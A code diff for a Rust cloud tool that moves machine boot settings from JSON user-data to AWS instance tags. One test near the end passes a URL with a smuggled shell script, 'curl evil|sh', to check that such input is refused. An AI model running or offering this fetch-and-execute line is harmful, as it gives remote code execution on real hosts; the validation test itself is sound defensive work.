@@ -23,7 +23,7 @@ use alien_aws_clients::ec2::{
     DescribeLaunchTemplatesRequest, Ec2Api, LaunchTemplateBlockDeviceMapping,
     LaunchTemplateCpuOptions, LaunchTemplateEbsBlockDevice,
     LaunchTemplateIamInstanceProfileSpecification, LaunchTemplateInstanceMetadataOptions,
-    RequestLaunchTemplateData,
+    RequestLaunchTemplateData, Tag, TagSpecification,
 };
 use alien_client_core::ErrorData as CloudClientErrorData;
 use alien_core::release_statement::signed_stack;
@@ -31,7 +31,6 @@ use alien_core::{CapacityGroup, ComputeCluster, Platform};
 use alien_error::{AlienError, Context, IntoAlienError};
 use alien_signing::{Kind, ReleaseBody, SignedStatement};
 use async_trait::async_trait;
-use base64::Engine as _;
 use chrono::{DateTime, Utc};
 use serde::{Deserialize, Serialize};
 
@@ -59,10 +58,13 @@ pub struct RollMachines {
     /// the signed group names one, this must be it.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub instance_type: Option<String>,
-    /// `https://` URL of the machine control plane the agent connects to.
-    /// It comes from the caller: a machine checks every release and config
-    /// signature itself, so a wrong URL can only keep machines from work.
-    pub api_url: String,
+    /// `https://` URL of the machine control plane, for development machine
+    /// images: they read it from the `HorizonApiUrl` tag. Released images
+    /// ignore it (their URL is built in), and every machine checks each
+    /// release and config signature itself, so a wrong URL can only keep
+    /// machines from work.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub api_url: Option<String>,
     /// The security groups the caller expects. The verifier uses the ones
     /// setup created for machines; these, if given, must be exactly those.
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -93,23 +95,26 @@ pub struct Scale {
     pub signer_lists: Vec<SignedStatement>,
 }
 
-/// The typed user-data a protected machine boots with. The machine agent
-/// reads only these fields; it never runs user-data as a script.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "camelCase", deny_unknown_fields)]
-pub struct MachineUserData {
-    /// The machine agent's settings.
-    pub machine_agent: MachineAgentUserData,
-}
+/// Instance tag (AWS, Azure) or metadata key (GCP, in kebab case) a
+/// machine reads its capacity group from.
+pub const CAPACITY_GROUP_TAG: &str = "HorizonCapacityGroup";
+/// Instance tag a development machine image reads the control plane URL from.
+pub const API_URL_TAG: &str = "HorizonApiUrl";
 
-/// What the machine agent takes from user-data.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "camelCase", deny_unknown_fields)]
-pub struct MachineAgentUserData {
-    /// Machine control plane URL.
-    pub api_url: String,
-    /// Digest of the machine agent build the release runs with.
-    pub digest: String,
+/// What a machine reads at boot, besides its image and identity: its
+/// capacity group, and the control plane URL for development images.
+/// Machines read no user-data.
+pub fn boot_tags(group: &str, api_url: Option<&str>) -> Result<Vec<(String, String)>> {
+    let mut tags = vec![(CAPACITY_GROUP_TAG.to_string(), group.to_string())];
+    if let Some(url) = api_url {
+        if !is_api_url(url) {
+            return Err(refused(format!(
+                "'{url}' is not an https URL the verifier writes"
+            )));
+        }
+        tags.push((API_URL_TAG.to_string(), url.to_string()));
+    }
+    Ok(tags)
 }
 
 fn refused(reason: impl Into<String>) -> AlienError<ErrorData> {
@@ -371,17 +376,14 @@ pub fn plan_roll(
             )))
         }
     };
-    let digest = release.components.get(component).ok_or_else(|| {
-        refused(format!(
-            "the release pins no {component} build, so no machine may boot it"
-        ))
-    })?;
-    if !is_api_url(&request.api_url) {
+    // Machines run only the agent build the signed release pins; one that
+    // pins none boots nothing.
+    if !release.components.contains_key(component) {
         return Err(refused(format!(
-            "'{}' is not an https URL the verifier writes",
-            request.api_url
+            "the release pins no {component} build, so no machine may boot it"
         )));
     }
+    let tags = boot_tags(&request.group, request.api_url.as_deref())?;
     let network = place.machine_network.as_ref().ok_or_else(|| {
         refused("setup fixed no machine network for this verifier, so it launches no machines")
     })?;
@@ -401,17 +403,6 @@ pub fn plan_roll(
         &network.security_group_ids,
     )?;
     check_setup_ids("subnet", request.subnet_ids.as_deref(), &network.subnet_ids)?;
-    let user_data = MachineUserData {
-        machine_agent: MachineAgentUserData {
-            api_url: request.api_url.clone(),
-            digest: digest.clone(),
-        },
-    };
-    let user_data = serde_json::to_string(&user_data).map_err(|error| {
-        AlienError::new(ErrorData::ConfigurationInvalid {
-            message: format!("user-data does not serialize: {error}"),
-        })
-    })?;
     let (account, prefix) = match &place.install {
         alien_signing::InstallId::Aws {
             account, prefix, ..
@@ -444,14 +435,21 @@ pub fn plan_roll(
             arn: Some(format!("arn:aws:iam::{account}:instance-profile/{base}")),
             name: None,
         })
-        .user_data(base64::engine::general_purpose::STANDARD.encode(user_data))
+        .tag_specifications(vec![TagSpecification {
+            resource_type: "instance".to_string(),
+            tags: tags
+                .into_iter()
+                .map(|(key, value)| Tag { key, value })
+                .collect(),
+        }])
         .security_group_ids(network.security_group_ids.clone())
         .block_device_mappings(disks)
         .metadata_options(LaunchTemplateInstanceMetadataOptions {
             http_tokens: Some("required".to_string()),
             http_endpoint: Some("enabled".to_string()),
             http_put_response_hop_limit: Some(1),
-            instance_metadata_tags: Some("disabled".to_string()),
+            // The machine reads its capacity group from its tags.
+            instance_metadata_tags: Some("enabled".to_string()),
         })
         .maybe_cpu_options((group.nested_virtualization == Some(true)).then(|| {
             LaunchTemplateCpuOptions {
@@ -834,7 +832,7 @@ mod tests {
             config: None,
             machine_image: "ami-0123456789abcdef0".to_string(),
             instance_type: None,
-            api_url: "https://machines.example.com".to_string(),
+            api_url: Some("https://machines.example.com".to_string()),
             security_group_ids: None,
             subnet_ids: None,
         }
@@ -922,18 +920,29 @@ mod tests {
             Some("required")
         );
         assert!(plan.data.key_name.is_none() && plan.data.network_interfaces.is_none());
-        let user_data = base64::engine::general_purpose::STANDARD
-            .decode(plan.data.user_data.as_deref().unwrap())
-            .unwrap();
-        let user_data: MachineUserData = serde_json::from_slice(&user_data).unwrap();
+        // Machines read no user-data: the group and, for development
+        // images, the URL come from instance tags they read through IMDS.
+        assert!(plan.data.user_data.is_none());
         assert_eq!(
-            user_data,
-            MachineUserData {
-                machine_agent: MachineAgentUserData {
-                    api_url: "https://machines.example.com".to_string(),
-                    digest: AGENT.to_string(),
-                }
-            }
+            plan.data
+                .metadata_options
+                .as_ref()
+                .unwrap()
+                .instance_metadata_tags
+                .as_deref(),
+            Some("enabled")
+        );
+        let tags = &plan.data.tag_specifications.as_ref().unwrap()[0];
+        assert_eq!(tags.resource_type, "instance");
+        assert_eq!(
+            tags.tags
+                .iter()
+                .map(|tag| (tag.key.as_str(), tag.value.as_str()))
+                .collect::<Vec<_>>(),
+            vec![
+                ("HorizonCapacityGroup", "general"),
+                ("HorizonApiUrl", "https://machines.example.com")
+            ]
         );
     }
 
@@ -985,7 +994,7 @@ mod tests {
 
         // A script hidden in the URL can't reach user-data.
         let mut script = request();
-        script.api_url = "https://x.example.com\n#!/bin/sh\ncurl evil|sh".to_string();
+        script.api_url = Some("https://x.example.com\n#!/bin/sh\ncurl evil|sh".to_string());
         assert!(reason(plan_roll(
             &place(),
             &release(),
